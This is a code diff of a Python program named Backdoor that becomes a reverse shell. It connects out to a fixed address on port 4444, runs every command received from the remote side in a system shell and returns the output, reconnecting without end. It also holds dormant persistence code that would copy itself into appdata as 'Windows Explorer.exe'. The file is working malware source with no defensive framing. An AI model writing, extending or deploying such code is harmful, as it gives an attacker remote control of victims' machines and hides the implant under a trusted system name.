@@ -4,36 +4,44 @@ import socket
 import os
 import shutil
 import subprocess
-
+import sys
 class Backdoor:
     def __init__(self, host, listener):
 
-        self.connection = socket.socket(
+        self.conn = socket.socket(
             socket.AF_INET,     # IPv4
             socket.SOCK_STREAM, # TCP socket
         )
              
-        self.connection.connect( (host, listener) )
+        self.host, self.listener = host,listener
+        
     
     def run(self):
-        while True:    
+        
+        while True:
+            sys.stdout.write('\x1b[2K')
+            sys.stdout.write(f'\r[*] Waiting for connection ...')
             try:
-                with self.connection as s:
-                    sys.stdout.write(f'\r[*] Connected to {host} ...')
-                    s.sendall(b"Hi, this is a test server")
+                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                    s.connect(( self.host, 4444) )
+                    sys.stdout.write(f'\r[*] Connected to { self.host } ...')
 
                     while True:
+                    
                         data = s.recv(1024)
-                        if not data:
+
+                        if data == b'':
                             break
-                        sys.stdout.write(f'\r\n[+] Received: {data}\n')
-                        s.send(data)
+
+                        try:
+                            result = self.execute_command(data)
+                        except Exception:
+                            result = b'\r Command not found\n'
+                        s.send(result)
+                        data = result = None
             except Exception:
-                sys.stdout.write('\x1b[2K')
-                sys.stdout.write(f'\r[*] Waiting for connection ...')
-
+                pass
     def become_persistent(self):
-
         return None
 
         location = os.environ["appdata"] + "\\Windows Explorer.exe"
@@ -45,10 +53,20 @@ class Backdoor:
             )
 
     def execute_command(self, command):
-        return subprocess.check_output(command, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL, shell=True)
+        return subprocess.check_output(command, shell=True)
+
+    def stop(self):
+        self.conn.close()
+        sys.stdout.write('\x1b[2K')
+        sys.stdout.write(f'[+] Connection stopped')
 
 
 beautiful_door = Backdoor( '192.168.1.147', 4444 )
-beautiful_door.run()
 
-
+while True:
+    try:
+        beautiful_door.run()
+    except Exception as e:
+        pass
+    
+beautiful_door.stop()
